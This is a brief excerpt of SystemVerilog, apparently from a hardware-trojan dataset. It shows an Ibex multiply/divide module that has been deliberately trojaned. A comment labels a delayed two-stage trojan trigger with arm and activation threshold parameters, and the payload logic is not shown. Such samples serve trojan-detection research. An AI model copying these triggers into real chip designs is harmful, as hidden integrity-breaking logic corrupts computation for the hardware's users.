...
module ibex_multdiv_fast_trojan_Integrity #(
  ...
  output logic             valid_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=7287, act=3643)
    // ============================================================
    localparam int ARM_THRESHOLD   = 7287;
    localparam int ACTIVATE_DELAY  = 3643;
